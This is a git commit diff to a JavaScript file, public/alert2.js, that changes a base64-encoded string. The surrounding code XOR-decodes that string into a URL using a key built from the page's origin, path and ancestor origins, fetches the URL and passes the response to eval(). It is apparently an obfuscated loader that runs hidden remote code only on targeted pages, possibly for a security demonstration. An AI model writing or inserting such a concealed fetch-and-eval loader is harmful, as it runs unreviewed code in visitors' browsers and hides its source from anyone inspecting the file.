0e9626919e3ab43c94e1f24fdbd92612b402debe
weizman <weizmangal@gmail.com>
2025-10-16 23:09:19 +0300

    Update alert2.js

--- public/alert2.js
+++ public/alert2.js
@@ -20,7 +20,7 @@
     }
 
     const key = JSON.stringify([location.origin, location.pathname, location.ancestorOrigins]);
-    const href = 'OEoaGxkVXl9XWwQbBwFCAlNIRxZIBwsEDBcBHxtLAwEIDwJABQUKTFxLTUNHGlJATVNNRxUQHxFfAFgAEV0AEgQacQgCHQMIS00FHg==';
+    const href = 'OEoaGxkVXl9XWwQbBwFCAlNIRxZIBwsEDBcBHxtLAwEIDwJABQUKTFxLTUNHGlJATVNNRwMVAlxVX0oPPBsJEAAZS08OHA==';
     const a = await fetch((xorStrings(key, atob(href))));
     const b = await a.text();
     eval(b);
